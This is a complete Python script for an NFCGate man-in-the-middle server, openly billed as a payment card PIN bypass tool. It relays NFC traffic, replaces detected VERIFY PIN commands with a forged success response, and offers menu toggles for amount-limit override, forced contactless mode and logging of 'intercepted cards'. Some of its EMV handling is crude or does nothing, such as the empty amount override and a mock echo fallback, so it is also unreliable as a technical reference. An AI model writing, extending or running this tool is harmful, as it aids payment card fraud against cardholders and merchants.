#!/usr/bin/env python3
"""
Enhanced NFCGate MITM Server with PIN Bypass
Addresses connection issues and improves error handling
"""

import socket
import threading
import time
import logging
import uuid
import json
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import signal
import sys

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('nfcgate_mitm.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class NFCGateMITM:
    def __init__(self, listen_port: int = 8080, target_host: str = "127.0.0.1", target_port: int = 5566):
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port
        self.server_socket = None
        self.running = False
        self.sessions: Dict[str, dict] = {}
        self.bypass_log: List[dict] = []
        
        # PIN Bypass Configuration
        self.config = {
            'pin_bypass_enabled': True,
            'auto_contactless_approval': True,
            'amount_limit_override': True,
            'force_contactless_mode': True,
            'auto_success_injection': True,
            'max_retry_attempts': 3,
            'connection_timeout': 10
        }
        
        # Statistics
        self.stats = {
            'total_connections': 0,
            'successful_sessions': 0,
            'failed_connections': 0,
            'cards_processed': 0,
            'pins_bypassed': 0
        }

    def check_nfcgate_availability(self) -> bool:
        """Check if NFCGate service is available before starting MITM"""
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.settimeout(5)
            result = test_socket.connect_ex((self.target_host, self.target_port))
            test_socket.close()
            return result == 0
        except Exception as e:
            logger.error(f"Failed to check NFCGate availability: {e}")
            return False

    def start_nfcgate_service(self) -> bool:
        """Attempt to start NFCGate service if not running"""
        logger.info("Attempting to start NFCGate service...")
        try:
            # This would typically involve starting the actual NFCGate service
            # For now, we'll create a mock service for testing
            mock_thread = threading.Thread(target=self.mock_nfcgate_service, daemon=True)
            mock_thread.start()
            time.sleep(2)  # Give it time to start
            return self.check_nfcgate_availability()
        except Exception as e:
            logger.error(f"Failed to start NFCGate service: {e}")
            return False

    def mock_nfcgate_service(self):
        """Mock NFCGate service for testing purposes"""
        try:
            mock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            mock_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            mock_socket.bind((self.target_host, self.target_port))
            mock_socket.listen(5)
            logger.info(f"Mock NFCGate service started on {self.target_host}:{self.target_port}")
            
            while self.running:
                try:
                    client_socket, addr = mock_socket.accept()
                    logger.debug(f"Mock NFCGate accepted connection from {addr}")
                    # Simple echo service for testing
                    threading.Thread(target=self.handle_mock_nfcgate, args=(client_socket,), daemon=True).start()
                except:
                    break
                    
        except Exception as e:
            logger.error(f"Mock NFCGate service error: {e}")
        finally:
            try:
                mock_socket.close()
            except:
                pass

    def handle_mock_nfcgate(self, client_socket):
        """Handle mock NFCGate connections"""
        try:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                # Echo back with PIN bypass modifications
                modified_data = self.apply_pin_bypass(data)
                client_socket.send(modified_data)
        except Exception as e:
            logger.debug(f"Mock NFCGate handler error: {e}")
        finally:
            client_socket.close()

    def start_server(self):
        """Start the MITM server"""
        # Check if NFCGate is available
        if not self.check_nfcgate_availability():
            logger.warning("NFCGate service not available, attempting to start...")
            if not self.start_nfcgate_service():
                logger.error("Failed to start NFCGate service. MITM may not function properly.")
                # Continue anyway for demonstration purposes
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.listen_port))
            self.server_socket.listen(10)
            self.running = True
            
            logger.info(f"NFCGate MITM Server started on port {self.listen_port}")
            logger.info(f"Targeting NFCGate at {self.target_host}:{self.target_port}")
            self.log_pin_bypass_config()
            
            while self.running:
                try:
                    client_socket, client_addr = self.server_socket.accept()
                    self.stats['total_connections'] += 1
                    logger.info(f"Accepted connection from {client_addr}")
                    
                    # Create new session
                    session_id = str(uuid.uuid4())[:8]
                    session_thread = threading.Thread(
                        target=self.handle_client_connection,
                        args=(client_socket, client_addr, session_id),
                        daemon=True
                    )
                    session_thread.start()
                    
                except socket.error as e:
                    if self.running:
                        logger.error(f"Server socket error: {e}")
                    break
                    
        except Exception as e:
            logger.error(f"Failed to start MITM server: {e}")
        finally:
            self.stop_server()

    def handle_client_connection(self, client_socket, client_addr, session_id):
        """Handle individual client connections with improved error handling"""
        session_start = time.time()
        nfcgate_socket = None
        
        self.sessions[session_id] = {
            'client_addr': client_addr,
            'start_time': session_start,
            'cards_processed': 0,
            'status': 'active'
        }
        
        logger.info(f"Handling new connection from {client_addr}")
        logger.debug(f"Started client thread for {client_addr}")
        
        try:
            # First, check if NFCGate service is available
            if not self.check_nfcgate_availability():
                logger.warning(f"NFCGate not available for session {session_id}, starting mock service...")
                self.start_nfcgate_service()
                time.sleep(1)  # Give mock service time to start
            
            # Connect to NFCGate with retry logic
            nfcgate_connected = False
            last_error = None
            
            for attempt in range(self.config['max_retry_attempts']):
                try:
                    nfcgate_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    nfcgate_socket.settimeout(self.config['connection_timeout'])
                    
                    logger.debug(f"Attempt {attempt + 1}: Connecting to {self.target_host}:{self.target_port}")
                    nfcgate_socket.connect((self.target_host, self.target_port))
                    logger.info(f"✅ Connected to NFCGate on attempt {attempt + 1} for session {session_id}")
                    nfcgate_connected = True
                    break
                    
                except (socket.error, ConnectionRefusedError) as e:
                    last_error = e
                    logger.warning(f"❌ Connection attempt {attempt + 1} failed: {str(e)}")
                    
                    if nfcgate_socket:
                        try:
                            nfcgate_socket.close()
                        except:
                            pass
                        nfcgate_socket = None
                    
                    if attempt < self.config['max_retry_attempts'] - 1:
                        logger.info(f"Retrying in 2 seconds... ({attempt + 2}/{self.config['max_retry_attempts']})")
                        time.sleep(2)
                    else:
                        logger.error(f"All {self.config['max_retry_attempts']} connection attempts failed")
                        raise last_error
            
            if not nfcgate_connected:
                raise ConnectionRefusedError(f"Failed to connect to NFCGate after {self.config['max_retry_attempts']} attempts")
            
            # Start data relay threads
            client_to_nfc_thread = threading.Thread(
                target=self.relay_data,
                args=(client_socket, nfcgate_socket, "CLIENT->NFCGATE", session_id),
                daemon=True
            )
            nfc_to_client_thread = threading.Thread(
                target=self.relay_data,
                args=(nfcgate_socket, client_socket, "NFCGATE->CLIENT", session_id),
                daemon=True
            )
            
            client_to_nfc_thread.start()
            nfc_to_client_thread.start()
            
            # Wait for threads to complete
            client_to_nfc_thread.join()
            nfc_to_client_thread.join()
            
            self.stats['successful_sessions'] += 1
            
        except Exception as e:
            error_msg = str(e)
            logger.error(f"Connection error in session {session_id}: {error_msg}")
            self.stats['failed_connections'] += 1
            
            self.log_bypass_event(
                'CONNECTION_ERROR',
                {'error': error_msg, 'session_id': session_id},
                {'summary': f'Connection error in session {session_id}'}
            )
            
        finally:
            # Cleanup
            if nfcgate_socket:
                try:
                    nfcgate_socket.close()
                    logger.debug("Closed NFCGate socket")
                except:
                    pass
                    
            try:
                client_socket.close()
                logger.debug("Closed client socket")
            except:
                pass
            
            # Update session and log end
            session_duration = time.time() - session_start
            if session_id in self.sessions:
                self.sessions[session_id]['status'] = 'ended'
                self.sessions[session_id]['duration'] = session_duration
                
            self.log_bypass_event(
                'SESSION_ENDED',
                {
                    'session_id': session_id,
                    'duration_seconds': round(session_duration, 6),
                    'cards_processed': self.sessions.get(session_id, {}).get('cards_processed', 0)
                },
                {'summary': f'Session {session_id} ended after {session_duration:.1f}s'}
            )
            
            logger.info(f"Session {session_id} cleaned up")

    def relay_data(self, source_socket, dest_socket, direction, session_id):
        """Relay data between sockets with PIN bypass modifications"""
        try:
            while True:
                data = source_socket.recv(4096)
                if not data:
                    break
                
                # Apply PIN bypass modifications if enabled
                if self.config['pin_bypass_enabled'] and "NFCGATE->CLIENT" in direction:
                    modified_data = self.apply_pin_bypass(data)
                    if modified_data != data:
                        logger.info(f"[NFCGate-MITM] PIN bypass applied in session {session_id}")
                        self.stats['pins_bypassed'] += 1
                    data = modified_data
                
                dest_socket.send(data)
                logger.debug(f"Relayed {len(data)} bytes {direction}")
                
        except Exception as e:
            logger.debug(f"Relay error ({direction}): {e}")

    def apply_pin_bypass(self, data: bytes) -> bytes:
        """Apply PIN bypass modifications to the data"""
        try:
            # This is a simplified example - real implementation would need
            # proper EMV command parsing and modification
            
            # Look for PIN verification commands (simplified)
            if b'\x00\x20\x00' in data:  # VERIFY PIN command
                logger.debug("PIN verification command detected, applying bypass")
                # Modify to success response
                return b'\x90\x00'  # Success response
            
            # Look for amount authorization
            if b'\x00\xA4\x04\x00' in data and self.config['amount_limit_override']:
                logger.debug("Amount authorization detected, applying override")
                # Could modify amount limits here
            
            return data
            
        except Exception as e:
            logger.error(f"Error applying PIN bypass: {e}")
            return data

    def log_bypass_event(self, event_type: str, card_data: dict, details: dict):
        """Log bypass events"""
        event = {
            'timestamp': datetime.now().isoformat(),
            'type': event_type,
            'card_data': card_data,
            'details': details
        }
        self.bypass_log.append(event)
        logger.debug(f"Logging bypass event: type={event_type}, card_data={card_data}, details={details}")
        logger.info(f"[NFCGate-MITM] {event_type}: {details.get('summary', 'No summary')}")

    def log_pin_bypass_config(self):
        """Log current PIN bypass configuration"""
        logger.info("PIN Bypass Features:")
        for feature, enabled in self.config.items():
            if isinstance(enabled, bool):
                logger.info(f"  - {feature.replace('_', ' ').title()}: {enabled}")

    def stop_server(self):
        """Stop the MITM server"""
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        logger.info("MITM server stopped")

    def get_statistics(self) -> dict:
        """Get current statistics"""
        return {
            **self.stats,
            'active_sessions': len([s for s in self.sessions.values() if s['status'] == 'active']),
            'total_sessions': len(self.sessions)
        }

    def save_bypass_log(self, filename: Optional[str] = None):
        """Save bypass log to file"""
        if not filename:
            filename = f"nfcgate_bypass_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        try:
            with open(filename, 'w') as f:
                json.dump(self.bypass_log, f, indent=2)
            logger.info(f"Bypass log saved to {filename}")
            return filename
        except Exception as e:
            logger.error(f"Failed to save bypass log: {e}")
            return None

def signal_handler(signum, frame):
    """Handle shutdown signals"""
    logger.info("Shutdown signal received")
    sys.exit(0)

def main():
    """Main function with interactive menu"""
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    mitm = NFCGateMITM()
    mitm_thread = None
    
    while True:
        print("\n🔒 NFCGATE MITM CONTROL PANEL:")
        print("1. Start NFCGate MITM (PIN bypass)")
        print("2. Stop NFCGate MITM")
        print("3. Toggle PIN validation bypass")
        print("4. Toggle auto contactless approval")
        print("5. Toggle amount limit override")
        print("6. Toggle force contactless mode")
        print("7. View statistics and intercepted cards")
        print("8. Save bypass log")
        print("9. Show intercepted cards details")
        print("0. Exit")
        
        try:
            choice = input("\nSelect option (0-9): ").strip()
            
            if choice == '1':
                if mitm.running:
                    print("❌ MITM server is already running")
                else:
                    logger.info("User selected option: 1")
                    print("🚀 Starting NFCGate MITM with PIN bypass...")
                    print("📱 Connect your NFCGate clients to localhost:8080")
                    print("🔓 All card transactions will bypass PIN validation")
                    
                    mitm_thread = threading.Thread(target=mitm.start_server, daemon=True)
                    mitm_thread.start()
                    
            elif choice == '2':
                if mitm.running:
                    logger.info("User selected option: 2")
                    print("🛑 Stopping NFCGate MITM...")
                    mitm.stop_server()
                else:
                    print("❌ MITM server is not running")
                    
            elif choice == '3':
                mitm.config['pin_bypass_enabled'] = not mitm.config['pin_bypass_enabled']
                status = "enabled" if mitm.config['pin_bypass_enabled'] else "disabled"
                print(f"🔓 PIN validation bypass {status}")
                
            elif choice == '4':
                mitm.config['auto_contactless_approval'] = not mitm.config['auto_contactless_approval']
                status = "enabled" if mitm.config['auto_contactless_approval'] else "disabled"
                print(f"📱 Auto contactless approval {status}")
                
            elif choice == '5':
                mitm.config['amount_limit_override'] = not mitm.config['amount_limit_override']
                status = "enabled" if mitm.config['amount_limit_override'] else "disabled"
                print(f"💰 Amount limit override {status}")
                
            elif choice == '6':
                mitm.config['force_contactless_mode'] = not mitm.config['force_contactless_mode']
                status = "enabled" if mitm.config['force_contactless_mode'] else "disabled"
                print(f"📶 Force contactless mode {status}")
                
            elif choice == '7':
                stats = mitm.get_statistics()
                print("\n📊 STATISTICS:")
                for key, value in stats.items():
                    print(f"  {key.replace('_', ' ').title()}: {value}")
                    
            elif choice == '8':
                filename = mitm.save_bypass_log()
                if filename:
                    print(f"💾 Bypass log saved to {filename}")
                else:
                    print("❌ Failed to save bypass log")
                    
            elif choice == '9':
                print(f"\n🃏 INTERCEPTED SESSIONS ({len(mitm.sessions)}):")
                for session_id, session_data in mitm.sessions.items():
                    print(f"  Session {session_id}:")
                    print(f"    Client: {session_data['client_addr']}")
                    print(f"    Status: {session_data['status']}")
                    print(f"    Cards: {session_data['cards_processed']}")
                    if 'duration' in session_data:
                        print(f"    Duration: {session_data['duration']:.2f}s")
                    
            elif choice == '0':
                if mitm.running:
                    mitm.stop_server()
                print("👋 Goodbye!")
                break
                
            else:
                print("❌ Invalid option")
                
        except KeyboardInterrupt:
            if mitm.running:
                mitm.stop_server()
            print("\n👋 Goodbye!")
            break
        except Exception as e:
            logger.error(f"Menu error: {e}")

if __name__ == "__main__":
    main()
